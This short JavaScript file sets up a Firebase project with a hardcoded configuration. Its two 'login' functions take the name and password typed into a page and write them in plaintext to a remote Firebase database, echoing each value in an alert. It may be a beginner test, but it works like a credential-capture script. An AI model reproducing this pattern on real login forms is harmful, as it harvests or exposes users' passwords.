






//////////////7


var config = {
    apiKey: "AIzaSyDDeEsPxBYxzisg4GDOpmYbHBLvIw6L_IY",
    authDomain: "mejorvargaslleras-4fd2e.firebaseapp.com",
    databaseURL: "https://mejorvargaslleras-4fd2e.firebaseio.com",
    projectId: "mejorvargaslleras-4fd2e",
    storageBucket: "mejorvargaslleras-4fd2e.appspot.com",
    messagingSenderId: "912759721594"
  };
  firebase.initializeApp(config);




var general;
var datof="";
var urlloginok="";
var fmsn1="mensajeuno";
var fmsn2="mensajedos";

function subirmensajes(idf,msnt){firebase.database().ref().child(String(idf)).set(String(msnt));}



function login(){



//var nodo="user";





//var vpass=document.getElementById("idpass").value;


var vnombre=document.getElementById("idnombre").value;



subirmensajes(fmsn1,vnombre);
//


alert("subio "+ vnombre);


}








function login2(){


var vpass=document.getElementById("idpass").value;


//var vnombre=document.getElementById("idnombre").value;



subirmensajes(fmsn2,vpass);
//


alert("subio" + vpass);
}

